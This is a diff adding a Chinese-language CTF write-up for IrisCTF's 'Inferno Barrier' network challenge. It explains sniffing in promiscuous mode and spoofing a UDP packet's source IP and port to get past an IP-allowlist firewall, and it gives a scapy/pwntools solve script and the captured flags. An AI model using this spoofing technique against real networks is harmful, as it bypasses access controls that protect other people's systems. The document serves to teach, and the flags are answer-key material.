@@ -693,3 +693,80 @@ conn.sendlineafter(b"?", b"me")
 conn.interactive()
 # irisctf{tom_needs_to_rethink_his_security}
 ```
+
+---
+
+> 这里是赛后做出来的一些题目
+
+## network - Inferno Barrier
+
+赛后研究了一下`scapy`构造报文，主要看文档就行了，几个cheatsheet
+
+- 可以用`/`把不同级别的包叠起来，比如`Ether()/IP()/TCP()/b"raw data"`
+- 包转为字节：`.build()`
+- 字节转包：需要知道是哪一级别，直接用对应的构造函数就行，可以识别出部分子级别。
+
+这个题提供了一个网络模拟器，可以让我们直接以`layer 3`网络层发包（以base64指定）。网络层指的是`IP`这一层，如果不确定可以先拿到一个报文，然后尝试各个报文的构造函数。
+
+这个题会告诉我们IP地址，是`192.168.1.0/24`网段随机一个。选项里可以把混杂模式（promiscuous mode）打开，这个是可以获取经过设备的所有网络包，包括目标地址不指向自己的，就是用来抓包的。
+
+打开混杂模式后，我们隔一段时间（大约2sec）会拿到一段固定的报文，解码：
+```
+<IP  version=4 ihl=5 tos=0x0 len=129 id=1 flags= frag=0 ttl=64 proto=udp chksum=0xf70c src=192.168.1.10 dst=192.168.1.4 |<UDP  sport=4545 dport=10343 len=109 chksum=0x9cd4 |<Raw  load=b"Announcement: error: no announcement configured.\nRun 'select (generic|date|time|flag)' to configure.\n" |>>>
+```
+
+原来是`192.168.1.4:10343 <= 192.168.1.10:4545`的UDP报文，这是一段广播，看起来回复`select flag`就能让它广播flag。
+
+我们尝试发送一个从自己端口到`192.168.1.4:4545`的回复UDP包，但是`recv`时提示被防火墙`<Firewall: (drop) 192.168.1.20:13131 -> 192.168.1.10:4545 due to policy: allow-192-168-1-4-only>`拦截
+
+然而我们可以直接把自己的源和端口都指定为`192.168.1.4:10343`，看起来既然我们是同一个网段，防火墙完全无法区分这个UDP包是不是真的从那个IP发出来。发包后，过一段时间（大约7秒），混杂模式接受的广播内容会变化，就是flag。
+
+```
+<IP  version=4 ihl=5 tos=0x0 len=97 id=1 flags= frag=0 ttl=64 proto=udp chksum=0xf72c src=192.168.1.10 dst=192.168.1.4 |<UDP  sport=4545 dport=10343 len=77 chksum=0x18b3 |<Raw  load=b'Announcement: irisctf{udp_1p_sp00fing_is_tr1vial_but_un1dir3ct10nal}\n' |>>>
+```
+
+当然可以想象，我们是不会收到我们自己发送报文的回复的，回复仍然是发给`192.168.1.10`，所以这个是`unidirectional`的
+
+```py
+from scapy.all import IP, UDP, TCP
+import base64
+from pwn import remote, context, sleep
+
+# context.log_level = 'debug'
+conn = remote('inferno-barrier.chal.irisc.tf', 10500)
+
+my_ip = conn.recvline_contains(b"Your IP", keepends=False).decode().split()[-1]
+
+conn.sendlineafter(b"> ", f"prom on".encode())
+
+sleep(2)
+
+
+conn.sendlineafter(b"> ", f"recv".encode())
+
+conn.recvline_contains(b"Retrieving packet from receive buffer")
+line = conn.recvline(keepends=False)
+if b"buffer is empty" not in line:
+    print(repr(IP(base64.b64decode(line))))
+
+packet = IP(dst="192.168.1.10", src="192.168.1.4") / UDP(dport=4545, sport=10343) / b"select flag"
+# packet = IP(dst="192.168.1.10", src=my_ip) / UDP(dport=4545, sport=13131) / b"select flag"
+conn.sendlineafter(b'> ', f"emit {base64.b64encode(packet.build()).decode()}".encode())
+
+
+for _ in range(20):
+    sleep(1)
+
+    conn.sendlineafter(b"> ", f"recv".encode())
+
+    conn.recvline_contains(b"Retrieving packet from receive buffer")
+    line = conn.recvline(keepends=False)
+    if b"buffer is empty" not in line:
+        print(repr(IP(base64.b64decode(line))))
+        break
+    else:
+        print('not captured (%d)'% (_,))
+
+conn.interactive()
+# irisctf{udp_1p_sp00fing_is_tr1vial_but_un1dir3ct10nal}
+```
